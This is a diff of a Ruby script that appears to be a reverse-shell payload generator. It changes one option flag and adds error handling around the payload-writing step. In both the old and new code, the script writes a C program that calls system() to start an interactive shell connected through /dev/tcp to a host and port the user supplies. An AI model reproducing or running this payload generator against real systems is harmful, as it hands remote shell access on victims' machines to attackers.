@@ -30,7 +30,7 @@ require 'ostruct'
 
 options = OpenStruct.new
 OptionParser.new do |opt|
-  opt.on('-h', '--local-host <local_host>', 'Local host.') { |o| options.local_host = o }
+  opt.on('-l', '--local-host <local_host>', 'Local host.') { |o| options.local_host = o }
   opt.on('-p', '--local-port <local_port>', 'Local port.') { |o| options.local_port = o }
   opt.on('-s', '--target-shell <target_shell>', 'Target shell.') { |o| options.target_shell = o }
   opt.on('-o', '--output-file <output_file>', 'Output file.') { |o| options.output_file = o }
@@ -41,12 +41,19 @@ port = options.local_port
 shell = options.target_shell
 file = options.output_file
 
-sleep(0.5)
-puts "#{g}Writing payload..."
-sleep(1)
-open(file, 'w') { |f|
-    f.puts "#include <stdio.h>"
-    f.puts "int main() {"
-    f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
-    f.puts "}"
-}
+begin
+    sleep(0.5)
+    puts "#{g}Writing payload..."
+    sleep(1)
+    puts "#{g}Saving to #{file}..."
+    sleep(0.5)
+    open(file, 'w') { |f|
+        f.puts "#include <stdio.h>"
+        f.puts "int main() {"
+        f.puts "    system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\");"
+        f.puts "}"
+    }
+    puts "#{s}Saved to #{file}!"
+rescue
+    puts "#{e}Failed to write payload!"
+end
